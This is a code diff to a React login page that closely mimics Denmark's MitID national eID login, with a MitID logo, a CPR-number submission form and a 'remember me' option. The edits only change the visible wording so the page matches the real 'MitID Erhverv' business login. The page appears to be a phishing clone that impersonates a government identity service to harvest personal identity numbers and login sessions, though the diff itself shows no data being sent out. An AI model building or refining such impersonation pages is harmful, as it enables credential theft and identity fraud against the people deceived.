@@ -98,7 +98,7 @@ export default function LoginPage({ onSessionCreated }: Props) {
             ) : (
               <form className="flex flex-col h-full" onSubmit={handleCprSubmit}>
                 <div className="flex items-start justify-between mb-2">
-                  <h1 className="text-[17px] font-bold text-[#001C44] leading-[1.35] pr-4">Log på hos MitID.dk</h1>
+                  <h1 className="text-[17px] font-bold text-[#001C44] leading-[1.35] pr-4">Log på MitID Erhverv</h1>
                   <MitIdLogo />
                 </div>
                 <hr className="border-gray-200 my-3" />
@@ -119,12 +119,12 @@ export default function LoginPage({ onSessionCreated }: Props) {
                   <span>{loading ? 'Forbinder...' : 'Fortsæt'}</span><ArrowIcon />
                 </button>
                 <div className="mt-3 mb-4">
-                  <a href="#" className="inline-flex items-center gap-1.5 text-[#0055a5] hover:underline text-[14px]"><InfoIcon /><span>Glemt bruger-ID?</span></a>
+                  <a href="#" className="inline-flex items-center gap-1.5 text-[#0055a5] hover:underline text-[14px]"><InfoIcon /><span>Glemt Bruger-ID?</span></a>
                 </div>
                 <div className="flex-1" />
                 <label className="flex items-start gap-3 cursor-pointer">
                   <input type="checkbox" checked={remember} onChange={(e) => setRemember(e.target.checked)} className="mt-0.5 w-[18px] h-[18px] accent-[#0055a5] rounded cursor-pointer shrink-0" />
-                  <span className="text-[14px] text-[#001C44] leading-snug">Husk mig på MitID.dk</span>
+                  <span className="text-[14px] text-[#001C44] leading-snug">Husk mig hos MitID Erhverv</span>
                 </label>
                 <hr className="border-gray-200 mt-4 mb-3" />
                 <nav className="flex items-center gap-6 text-[14px] text-[#0055a5]">
